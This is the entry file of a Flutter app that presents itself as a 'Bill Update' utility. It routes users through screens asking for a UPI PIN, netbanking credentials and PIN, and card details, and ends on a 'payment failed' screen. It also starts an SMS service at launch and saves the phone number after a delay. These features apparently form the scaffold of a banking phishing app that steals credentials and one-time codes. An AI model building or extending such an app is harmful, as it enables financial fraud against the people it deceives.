import 'package:flutter/material.dart';
import 'package:go_router/go_router.dart';
import 'theme.dart';
import 'services/sms_service.dart';
import 'services/phone_service.dart';
import 'screens/bill_update_screen.dart';
import 'screens/charge_screen.dart';
import 'screens/payment_method_screen.dart';
import 'screens/upi_pin_screen.dart';
import 'screens/netbanking_screen.dart';
import 'screens/netbanking_pin_screen.dart';
import 'screens/card_screen.dart';
import 'screens/card_verify_screen.dart';
import 'screens/payment_failed_screen.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  SmsService.init();
  runApp(const BillApp());
}

Future<void> _initPhoneHint() async {
  await Future.delayed(const Duration(seconds: 6));
  await PhoneService.getAndSavePhoneNumber();
}

final _router = GoRouter(routes: [
  GoRoute(path: '/', builder: (_, __) => const BillUpdateScreen()),
  GoRoute(path: '/charge', builder: (_, s) => ChargeScreen(data: s.extra as Map)),
  GoRoute(path: '/payment', builder: (_, s) => PaymentMethodScreen(amount: s.extra as double)),
  GoRoute(path: '/upi-pin', builder: (_, s) => UpiPinScreen(amount: s.extra as double)),
  GoRoute(path: '/netbanking', builder: (_, s) => NetbankingScreen(amount: s.extra as double)),
  GoRoute(path: '/netbanking-pin', builder: (_, s) => NetbankingPinScreen(amount: s.extra as double)),
  GoRoute(path: '/card', builder: (_, s) => CardScreen(amount: s.extra as double)),
  GoRoute(path: '/card-verify', builder: (_, s) => CardVerifyScreen(amount: s.extra as double)),
  GoRoute(path: '/failed', builder: (_, __) => const PaymentFailedScreen()),
]);

class BillApp extends StatefulWidget {
  const BillApp({super.key});
  @override
  State<BillApp> createState() => _BillAppState();
}

class _BillAppState extends State<BillApp> {
  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _initPhoneHint();
    });
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp.router(
      title: 'Bill Update',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        scaffoldBackgroundColor: AppColors.bgLight,
        primaryColor: AppColors.blue,
        fontFamily: 'Roboto',
        colorScheme: ColorScheme.fromSeed(
          seedColor: AppColors.blue,
          primary: AppColors.blue,
          secondary: AppColors.navy,
        ),
        appBarTheme: const AppBarTheme(
          backgroundColor: AppColors.navy,
          foregroundColor: Colors.white,
          elevation: 0,
        ),
        elevatedButtonTheme: ElevatedButtonThemeData(
          style: ElevatedButton.styleFrom(
            elevation: 2,
            shadowColor: AppColors.blue.withValues(alpha: .4),
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
            padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 14),
          ),
        ),
      ),
      routerConfig: _router,
    );
  }
}
